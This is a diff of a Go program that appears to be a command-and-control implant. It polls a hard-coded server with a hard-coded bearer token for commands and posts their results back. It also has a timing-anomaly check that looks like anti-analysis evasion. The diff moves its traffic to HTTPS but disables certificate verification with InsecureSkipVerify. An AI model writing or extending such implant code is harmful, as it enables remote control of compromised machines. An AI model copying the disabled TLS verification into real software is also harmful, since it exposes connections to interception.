@@ -3,6 +3,7 @@ package main
 import (
     "bufio"
     "bytes"
+    "crypto/tls"
     "encoding/base64"
     "encoding/json"
     "fmt"
@@ -27,7 +28,7 @@ import (
 var (
     mu               sync.Mutex
     isCommandRunning bool
-    serverURL        = "http://192.168.56.101:5000"
+    serverURL        = "https://192.168.56.101:5000"
     bearerToken      = "Azerty112345678"
 )
 
@@ -114,7 +115,13 @@ func fetchCommand() (Command, error) {
     // Add hard-coded Bearer token for authentication
     req.Header.Set("Authorization", "Bearer "+bearerToken)
 
-    client := &http.Client{Timeout: 15 * time.Second}
+    tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ⚠ For local testing only
+    }
+    client := &http.Client{
+        Transport: tr,
+        Timeout:   15 * time.Second,
+    }
     resp, err := client.Do(req)
     if err != nil {
         return cmd, err
@@ -160,7 +167,13 @@ func sendResult(result CommandResult) {
     req.Header.Set("Authorization", "Bearer "+bearerToken)
     req.Header.Set("Content-Type", "application/json")
 
-    client := &http.Client{Timeout: 15 * time.Second}
+    tr := &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+    }
+    client := &http.Client{
+        Transport: tr,
+        Timeout:   15 * time.Second,
+    }
     resp, err := client.Do(req)
     if err != nil {
         log.Printf("Failed to send result: %v", err)
@@ -656,3 +669,4 @@ func checkTimingAnomaly() bool {
         duration := time.Since(start)
         return duration > 80*time.Millisecond
 }
+       
